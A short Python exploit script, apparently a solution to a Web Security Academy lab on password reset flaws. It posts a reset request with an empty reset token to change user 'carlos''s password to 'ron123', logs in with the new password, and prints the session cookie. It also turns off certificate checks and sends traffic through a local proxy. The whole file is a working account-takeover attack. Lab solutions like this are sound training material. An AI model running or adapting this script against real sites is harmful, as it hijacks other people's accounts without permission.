import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app_url = "https://0adf006a03d9c93c81f5776600a0004b.web-security-academy.net/"     #application url
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} 

#reset password of carlos to ron123

reset_data = {'temp-forgot-password-token':'','username':'carlos','new-password-1':'ron123','new-password-2':'ron123'}


r = requests.post(app_url+"forgot-password?temp-forgot-password-token=",verify=False,proxies=proxies,data=reset_data)

#login as carlos
session_carlos = requests.session()
login_data_carlos = {'username':'carlos','password':'ron123'}
car_login_res = session_carlos.post(app_url+"login", verify=False, proxies=proxies, data=login_data_carlos)
print("login as carlos successful, session cookie value is", session_carlos.cookies.get_dict())